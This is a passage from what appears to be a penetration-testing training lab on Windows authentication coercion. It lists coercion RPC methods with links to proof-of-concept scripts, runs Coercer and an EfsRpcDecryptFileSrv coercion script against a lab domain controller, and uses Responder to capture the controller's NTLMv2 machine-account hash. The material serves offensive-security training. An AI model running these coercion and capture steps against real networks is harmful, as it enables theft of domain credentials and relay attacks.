| MS-DFSNM | [NetrDfsRemoveStdRoot](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-DFSNM%20-%20Distributed%20File%20System%20(DFS)%20Namespace%20Management%20Protocol/13.%20Remote%20call%20to%20NetrDfsRemoveStdRoot%20(opnum%2013)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-DFSNM%20-%20Distributed%20File%20System%20(DFS)%20Namespace%20Management%20Protocol/13.%20Remote%20call%20to%20NetrDfsRemoveStdRoot%20(opnum%2013)/coerce_poc.py) |
| MS-EFSR | [EfsRpcOpenFileRaw](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/00.%20Remote%20call%20to%20EfsRpcOpenFileRaw%20(opnum%200)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/00.%20Remote%20call%20to%20EfsRpcOpenFileRaw%20(opnum%200)/coerce_poc.py) |
| MS-EFSR | [EfsRpcEncryptFileSrv](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/04.%20Remote%20call%20to%20EfsRpcEncryptFileSrv%20(opnum%204)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/04.%20Remote%20call%20to%20EfsRpcEncryptFileSrv%20(opnum%204)/coerce_poc.py) |
| MS-EFSR | [EfsRpcDecryptFileSrv](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/05.%20Remote%20call%20to%20EfsRpcDecryptFileSrv%20(opnum%205)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/05.%20Remote%20call%20to%20EfsRpcDecryptFileSrv%20(opnum%205)/coerce_poc.py) |
| MS-EFSR | [EfsRpcQueryUsersOnFile](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/06.%20Remote%20call%20to%20EfsRpcQueryUsersOnFile%20(opnum%206)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/06.%20Remote%20call%20to%20EfsRpcQueryUsersOnFile%20(opnum%206)/coerce_poc.py) |
| MS-EFSR | [EfsRpcQueryRecoveryAgents](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/07.%20Remote%20call%20to%20EfsRpcQueryRecoveryAgents%20(opnum%207)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/07.%20Remote%20call%20to%20EfsRpcQueryRecoveryAgents%20(opnum%207)/coerce_poc.py) |
| MS-EFSR | [EfsRpcFileKeyInfo](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/12.%20Remote%20call%20to%20EfsRpcFileKeyInfo%20(opnum%2012)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/12.%20Remote%20call%20to%20EfsRpcFileKeyInfo%20(opnum%2012)/coerce_poc.py) |
| MS-EFSR | [EfsRpcDuplicateEncryptionInfoFile](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/13.%20Remote%20call%20to%20EfsRpcDuplicateEncryptionInfoFile%20(opnum%2013)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/13.%20Remote%20call%20to%20EfsRpcDuplicateEncryptionInfoFile%20(opnum%2013)/coerce_poc.py) |
| MS-EFSR | [EfsRpcAddUsersToFileEx](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/15.%20Remote%20call%20to%20EfsRpcAddUsersToFileEx%20(opnum%2015)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/15.%20Remote%20call%20to%20EfsRpcAddUsersToFileEx%20(opnum%2015)/coerce_poc.py) |
| MS-EFSR | [EfsRpcFileKeyInfoEx](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/16.%20Remote%20call%20to%20EfsRpcFileKeyInfoEx%20(opnum%2016)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-EFSR%20-%20Encrypting%20File%20System%20Remote%20(EFSRPC)%20Protocol/16.%20Remote%20call%20to%20EfsRpcFileKeyInfoEx%20(opnum%2016)/coerce_poc.py) |
| MS-FSRVP | [IsPathSupported](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-FSRVP%20-%20File%20Server%20Remote%20VSS%20Protocol/08.%20Remote%20call%20to%20IsPathSupported%20(opnum%208)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-FSRVP%20-%20File%20Server%20Remote%20VSS%20Protocol/08.%20Remote%20call%20to%20IsPathSupported%20(opnum%208)/coerce_poc.py) |
| MS-FSRVP | [IsPathShadowCopied](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-FSRVP%20-%20File%20Server%20Remote%20VSS%20Protocol/09.%20Remote%20call%20to%20IsPathShadowCopied%20(opnum%209)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-FSRVP%20-%20File%20Server%20Remote%20VSS%20Protocol/09.%20Remote%20call%20to%20IsPathShadowCopied%20(opnum%209)/coerce_poc.py) |
| MS-PAR | [RpcAsyncOpenPrinter](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-PAR%20-%20Print%20System%20Asynchronous%20Remote%20Protocol/00.%20Remote%20call%20to%20RpcAsyncOpenPrinter%20(opnum%200)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-PAR%20-%20Print%20System%20Asynchronous%20Remote%20Protocol/00.%20Remote%20call%20to%20RpcAsyncOpenPrinter%20(opnum%200)/coerce_poc.py) |
| MS-RPRN | [RpcRemoteFindFirstPrinterChangeNotificationEx](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/62.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotification%20(opnum%2062)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/62.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotification%20(opnum%2062)/coerce_poc.py) |
| MS-RPRN | [RpcRemoteFindFirstPrinterChangeNotificationEx](https://github.com/p0dalirius/windows-coerced-authentication-methods/tree/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/65.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotificationEx%20(opnum%2065)) | [coerce_poc.py](https://github.com/p0dalirius/windows-coerced-authentication-methods/blob/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/65.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotificationEx%20(opnum%2065)/coerce_poc.py) |

### Finding a Method

```sh
htb-student@ubuntu:~$ coercer scan -t 172.16.117.3 -u 'plaintext$' -p 'Password123!' -v
```

```output title="Output" hl_lines="11"
[info] Starting scan mode
[info] Scanning target 172.16.117.3
[+] Listening for authentications on '172.16.117.30', SMB port 445
[!] SMB named pipe '\PIPE\Fssagentrpc' is not accessible!
[!] SMB named pipe '\PIPE\efsrpc' is not accessible!
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\172.16.117.30\qaXj7ZFs\aa')
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\wAY4bYQE\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\j1zHl72H\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\3Aovj5RG\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/3hD\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\8ynuLO6l\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\mV9lmCl2\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\qyGurJPa\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/a3x\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\fgq19Yt5\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\oY2btTdO\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\CB0ZQMZO\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/QBQ\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\do40Zu9F\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\FpCVx6bF\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\xEeyIm2l\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/5vF\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\pupmp4yX\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\J12KT5Aq\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\r7AjXDR8\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/DlR\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\iJ4MiQDL\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\YKv2qQsD\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\PqCNFXT6\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/HT6\file.txt\x00')
[+] SMB named pipe '\PIPE\lsass' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\gdknlnGx\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\jrSZwraf\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\QPc2eqbp\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/Mid\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\BXoiL7jl\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\PNHJVKMu\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\8Tl1LbX5\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/QOK\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\8trQcXIu\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\AkdsN229\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\IW9AFL2Q\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/nWH\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\7WL6NvCf\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\RhsuhFvh\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\zEEWgxio\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/W2A\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\P3OsjbNw\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\6IczTdZh\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\McXqXud3\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/XIo\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\cN6fU4c5\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\9JB9Mfte\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\paxhwXIj\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/JCL\file.txt\x00')
[+] SMB named pipe '\PIPE\netdfs' is accessible!
   [+] Successful bind to interface (4fc742e0-4a10-11cf-8273-00aa004ae673, 3.0)!
[+] SMB named pipe '\PIPE\netlogon' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\9YgEtTwc\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\bLQeNsTr\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\wt3JZLeK\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/eI6\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\QdK0oo4B\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\6xoEGcsl\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\mGGaUIiW\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/pZz\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\Lsa05rni\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\n7SiB7aU\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\HBy1x5Xd\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/gFY\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\KBtcVh9Y\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\Pa7aRXWK\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\YxU4aQyT\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/awU\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\H3s1xFXC\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\rXfmc9rd\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\t1PFnqTQ\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/Rvv\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\2KmeOLjY\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\CaaQpEvp\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\yhqlZcqy\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/HKW\file.txt\x00')
[+] SMB named pipe '\PIPE\samr' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\OcEH8JSl\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\pXdvxjpj\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30\URl9I9SO\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\172.16.117.30@80/W96\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\2L7Ax8CW\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\BaG3AmnU\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30\tMb5vvDg\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcEncryptFileSrv(FileName='\\172.16.117.30@80/jer\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\3W8jW1J0\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\Lp1i2tUG\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30\t1bUby6C\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcFileKeyInfo(FileName='\\172.16.117.30@80/arp\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\ay7YXpLN\file.txt\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\n0NwgVNi\\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30\nlFZG5ys\x00')
      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcOpenFileRaw(FileName='\\172.16.117.30@80/4jt\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\akeQspRf\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\FhgUd22W\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30\eeS4KSDD\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryRecoveryAgents(FileName='\\172.16.117.30@80/cfk\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\gsVnV2k3\file.txt\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\dWPiaQGX\\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30\hxnGcPwA\x00')
      [!] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcQueryUsersOnFile(FileName='\\172.16.117.30@80/6mG\file.txt\x00')
[+] SMB named pipe '\PIPE\spoolss' is accessible!
   [+] Successful bind to interface (12345678-1234-abcd-ef00-0123456789ab, 1.0)!
[+] All done! Bye Bye!
```

### Responder

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

### EfsRpcDecryptFileSrv

| ATTACK MACHINE | TARGET |
|---|---|
| 172.16.117.30 | 172.16.117.3 |

```sh
htb-student@ubuntu:~$ python3 coerce_poc.py 172.16.117.30 172.16.117.3 -u 'plaintext$' -p 'Password123!' -d INLANEFREIGHT.LOCAL
```

```output title="Output" hl_lines="6"
Windows auth coerce using MS-EFSR::EfsRpcDecryptFileSrv()

[>] Connecting to ncacn_np:172.16.117.3[\PIPE\netlogon] ... success
[>] Binding to <uuid='c681d488-d850-11d0-8c52-00c04fd90f7e', version='1.0'> ... success
[>] Calling EfsRpcDecryptFileSrv() ...
SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
```

### Responder Results

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

```output title="Output"
[SMB] NTLMv2-SSP Client   : 172.16.117.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::INLANEFREIGHT:a640d81ed70c40ca:CF962FA899FA6AB49BA78D8EBD39224C:01010000000000008089D8596F77DB0147C76F73B9A7C1D800000000020008004D0057005100360001001E00570049004E002D0046004F00480030005200450051004A0045004E00570004003400570049004E002D0046004F00480030005200450051004A0045004E0057002E004D005700510036002E004C004F00430041004C00030014004D005700510036002E004C004F00430041004C00050014004D005700510036002E004C004F00430041004C00070008008089D8596F77DB01060004000200000008003000300000000000000000000000004000003A600769CC8D9EF2291C7C279C2DCCE7636A4529120C6EF6D520CFF93E9632590A001000000000000000000000000000000000000900240063006900660073002F003100370032002E00310036002E003100310037002E00330030000000000000000000
```
